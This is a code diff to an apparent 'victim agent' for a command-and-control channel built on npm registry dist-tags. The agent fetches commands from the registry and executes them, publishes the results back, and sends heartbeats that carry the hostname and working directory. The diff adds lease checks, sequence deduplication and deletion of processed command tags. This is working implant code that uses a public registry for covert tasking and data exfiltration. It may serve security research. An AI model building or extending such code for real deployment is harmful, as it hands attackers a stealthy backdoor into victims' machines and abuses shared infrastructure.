@@ -14,13 +14,15 @@ import os from 'node:os';
 import path from 'node:path';
 import crypto from 'node:crypto';
 import { pathToFileURL } from 'node:url';
-import { loadConfig, configArgFromArgv } from '../common/config.js';
+import { channelTimings, loadConfig, configArgFromArgv } from '../common/config.js';
 import { createLogger } from '../common/logger.js';
 import {
   PINNED_VERSION,
+  decodeAnnounceTag,
   decodeCommandTag,
   encodeAnnounceTag,
   encodeResultTags,
+  isAnnounceTag,
   isCommandTag,
 } from '../common/protocol.js';
 import { RegistryClient } from '../common/registry.js';
@@ -67,6 +69,7 @@ export function saveState(statePath, state) {
 export function selectCommands(distTags, state, agentId) {
   const commands = [];
   const skipped = [];
+  const selectedSequences = new Set();
   for (const name of Object.keys(distTags)) {
     if (!isCommandTag(name)) continue;
     let cmd;
@@ -79,10 +82,68 @@ export function selectCommands(distTags, state, agentId) {
     if (cmd.agentId !== agentId && cmd.agentId !== 'all') continue;
     const last = state.lastSeq[cmd.agentId] ?? 0;
     if (cmd.seq <= last) continue; // already processed (dedup)
+    const key = `${cmd.agentId}:${cmd.seq}`;
+    if (selectedSequences.has(key)) {
+      skipped.push({ tag: name, reason: `duplicate command sequence ${key}` });
+      continue;
+    }
+    selectedSequences.add(key);
     commands.push({ tag: name, ...cmd });
   }
   commands.sort((a, b) => a.seq - b.seq);
   return { commands, skipped };
+}
+
+export function isCommandExpired(payload, now, taskTtlMs) {
+  const sentAt = Number(payload?.ts);
+  if (!Number.isFinite(sentAt)) return Number.isFinite(taskTtlMs);
+  return now - sentAt >= taskTtlMs;
+}
+
+export function encodeHeartbeatTag(agentId, payload) {
+  const clip = (value) => typeof value === 'string' ? value.slice(0, 40) : undefined;
+  const candidates = [
+    payload,
+    { ts: payload.ts, lease: payload.lease, cwd: clip(payload.cwd), host: clip(payload.host) },
+    { ts: payload.ts, lease: payload.lease, host: clip(payload.host) },
+    { ts: payload.ts, lease: payload.lease },
+  ];
+  let lastError;
+  for (const candidate of candidates) {
+    try {
+      return encodeAnnounceTag(agentId, candidate);
+    } catch (err) {
+      lastError = err;
+    }
+  }
+  throw lastError;
+}
+
+export async function publishHeartbeat({
+  client,
+  agentId,
+  distTags,
+  now,
+  cwd,
+  host,
+  lease,
+  onPublished,
+  logger,
+}) {
+  const tag = encodeHeartbeatTag(agentId, { ts: now, cwd, host, lease });
+  await client.setDistTag(tag, PINNED_VERSION);
+  onPublished?.(tag);
+
+  for (const oldTag of Object.keys(distTags)) {
+    if (oldTag === tag || !isAnnounceTag(oldTag)) continue;
+    try {
+      if (decodeAnnounceTag(oldTag).agentId !== agentId) continue;
+      await client.deleteDistTag(oldTag);
+    } catch (err) {
+      logger.warn(`failed to clean old heartbeat "${oldTag}": ${err.message}`);
+    }
+  }
+  return tag;
 }
 
 // ---------------------------------------------------------------------------
@@ -98,17 +159,45 @@ export function selectCommands(distTags, state, agentId) {
  * @param {object} deps.logger
  * @param {Function} [deps.save] persist callback, called after each state change
  * @param {object} [deps.limits] task limits, e.g. { maxFileBytes }
+ * @param {Set<string>} [deps.validLeases] recently published heartbeat leases
  * @returns {Promise<{executed: number, resultsPublished: number, skipped: number}>}
  */
-export async function processDistTags({ distTags, state, agentId, client, logger, save, limits = {} }) {
+export async function processDistTags({
+  distTags,
+  state,
+  agentId,
+  client,
+  logger,
+  save,
+  limits = {},
+  validLeases = null,
+}) {
   const { commands, skipped } = selectCommands(distTags, state, agentId);
   for (const s of skipped) {
     logger.warn(`skipping malformed tag "${s.tag}": ${s.reason}`);
   }
 
   let resultsPublished = 0;
+  let executed = 0;
+  let rejected = 0;
   for (const cmd of commands) {
+    const invalidLease = validLeases instanceof Set
+      && (cmd.agentId === 'all' || !validLeases.has(cmd.payload?.lease));
+    if (invalidLease) {
+      state.lastSeq[cmd.agentId] = cmd.seq;
+      if (save) save();
+      rejected++;
+      logger.warn(`missing or stale lease for seq ${cmd.seq} (target ${cmd.agentId}); command was not executed`);
+      try {
+        await client.deleteDistTag(cmd.tag);
+      } catch (err) {
+        logger.warn(`failed to delete stale command "${cmd.tag}": ${err.message}`);
+      }
+      continue;
+    }
+
     logger.info(`executing seq ${cmd.seq} (target ${cmd.agentId}): op=${cmd.payload.op}`);
+    executed++;
     const result = runTask(cmd.payload.op, cmd.payload.args ?? {}, limits);
     const resultPayload = {
       seq: cmd.seq,
@@ -137,9 +226,17 @@ export async function processDistTags({ distTags, state, agentId, client, logger
     } catch (err) {
       logger.error(`failed to publish result for seq ${cmd.seq}: ${err.message}`);
     }
+
+    if (cmd.agentId !== 'all') {
+      try {
+        await client.deleteDistTag(cmd.tag);
+      } catch (err) {
+        logger.warn(`failed to delete processed command "${cmd.tag}": ${err.message}`);
+      }
+    }
   }
 
-  return { executed: commands.length, resultsPublished, skipped: skipped.length };
+  return { executed, resultsPublished, skipped: skipped.length + rejected };
 }
 
 // ---------------------------------------------------------------------------
@@ -147,6 +244,36 @@ export async function processDistTags({ distTags, state, agentId, client, logger
 // ---------------------------------------------------------------------------
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+/**
+ * Publish heartbeats on an independent async schedule so sequential registry
+ * writes for task results cannot starve presence updates.
+ */
+export async function runHeartbeatLoop({
+  heartbeatMs,
+  isRunning,
+  publish,
+  logger,
+  sleepFn = sleep,
+  nowFn = Date.now,
+  sleepSliceMs = 200,
+}) {
+  while (isRunning()) {
+    const startedAt = nowFn();
+    try {
+      await publish();
+      logger?.debug('heartbeat published');
+    } catch (err) {
+      logger?.warn(`failed to publish heartbeat: ${err.message}`);
+    }
+
+    const remainingMs = Math.max(0, heartbeatMs - (nowFn() - startedAt));
+    for (let slept = 0; isRunning() && slept < remainingMs; slept += sleepSliceMs) {
+      const slice = Math.min(sleepSliceMs, remainingMs - slept);
+      await sleepFn(slice);
+    }
+  }
+}
 
 async function main() {
   const cfg = loadConfig(configArgFromArgv());
@@ -173,26 +300,13 @@ async function main() {
     token: cfg.token,
     logger,
   });
+  const timings = channelTimings(cfg.pollIntervalSec);
 
   logger.info(`victim agent ${state.agentId} starting`);
   logger.info(`registry=${cfg.registryUrl} package=${cfg.packageName} poll=${cfg.pollIntervalSec}s`);
   logger.info(`cwd=${process.cwd()} maxFileBytes=${cfg.maxFileBytes}`);
   if (!cfg.token) {
     logger.warn('NPM_C2_TOKEN is not set — result publishing will fail with 401');
-  }
-
-  // Announce ourselves once so the attacker CLI can show "agent joined".
-  // Best-effort: a failed announce must not stop the poll loop.
-  try {
-    const tag = encodeAnnounceTag(state.agentId, {
-      ts: Date.now(),
-      cwd: process.cwd(),
-      host: os.hostname(),
-    });
-    await client.setDistTag(tag, PINNED_VERSION);
-    logger.info('announce tag published');
-  } catch (err) {
-    logger.warn(`failed to publish announce tag: ${err.message}`);
   }
 
   let running = true;
@@ -209,6 +323,31 @@ async function main() {
   process.on('SIGINT', shutdown);
   process.on('SIGTERM', shutdown);
 
+  let heartbeatTag = '';
+  let heartbeatLeases = [];
+  const heartbeatPromise = runHeartbeatLoop({
+    heartbeatMs: timings.heartbeatMs,
+    isRunning: () => running,
+    logger,
+    publish: async () => {
+      const distTags = await client.getDistTags();
+      const lease = crypto.randomBytes(6).toString('hex');
+      heartbeatTag = await publishHeartbeat({
+        client,
+        agentId: state.agentId,
+        distTags,
+        now: Date.now(),
+        cwd: process.cwd(),
+        host: os.hostname(),
+        lease,
+        onPublished: () => {
+          heartbeatLeases = [...heartbeatLeases, lease].slice(-4);
+        },
+        logger,
+      });
+    },
+  });
+
   let consecutiveFailures = 0;
   while (running) {
     let delaySec = cfg.pollIntervalSec;
@@ -223,6 +362,7 @@ async function main() {
         logger,
         save,
         limits: { maxFileBytes: cfg.maxFileBytes },
+        validLeases: new Set(heartbeatLeases),
       });
       if (stats.executed > 0 || stats.skipped > 0) {
         logger.info('cycle summary', stats);
@@ -240,6 +380,14 @@ async function main() {
     }
   }
 
+  await heartbeatPromise;
+  if (heartbeatTag) {
+    try {
+      await client.deleteDistTag(heartbeatTag);
+    } catch (err) {
+      logger.warn(`failed to remove heartbeat during shutdown: ${err.message}`);
+    }
+  }
   save();
   logger.close();
   process.exit(0);
